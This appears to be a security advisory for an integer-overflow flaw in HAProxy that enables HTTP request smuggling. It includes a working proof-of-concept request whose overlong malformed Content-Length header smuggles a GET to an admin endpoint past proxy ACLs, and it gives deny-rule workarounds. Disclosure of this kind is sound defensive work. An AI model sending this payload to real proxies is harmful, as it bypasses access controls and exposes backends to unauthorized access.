Description
-------------------
Due to an integer overflow, a parsing error is created in HAProxy that allows an attacker to specify two `Content-Length` headers with different sizes. Subsequently, this allows an attacker to perform HTTP smuggling. This attack allows an adversary to smuggle HTTP requests to the backend server, without the proxy server being aware of it. The smuggled requests have various impacts, depending on HAProxyâ€™s configuration and the backend web server configuration: Bypassing security controls, including any ACLs defined in HAProxy, Gaining unauthorized access to sensitive data, Executing unauthorized commands or modifying data, Hijacking user sessions, Exploiting a reflected XSS vulnerability without user interaction.

PoC
-------------------
Any attacker that can send requests through the proxy, can exploit this issue, by sending requests such as:

```
POST /index.html HTTP/1.1
Host: abc.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 60

GET /admin/add_user.py HTTP/1.1
Host: abc.com
abc: xyz 


```

The GET request will be smuggled and will evade any ACLs defined in the HAProxy configuration file.

Workaround
-------------------
If you are not able to update right away, you can apply the following rules to your HAProxy configuration file to mitigate the issues. These should be added to your frontend.

```
frontend myfrontend
   http-request deny if { req.hdr_cnt(content-length) gt 1 }
   http-response deny if { res.hdr_cnt(content-length) gt 1 }
```
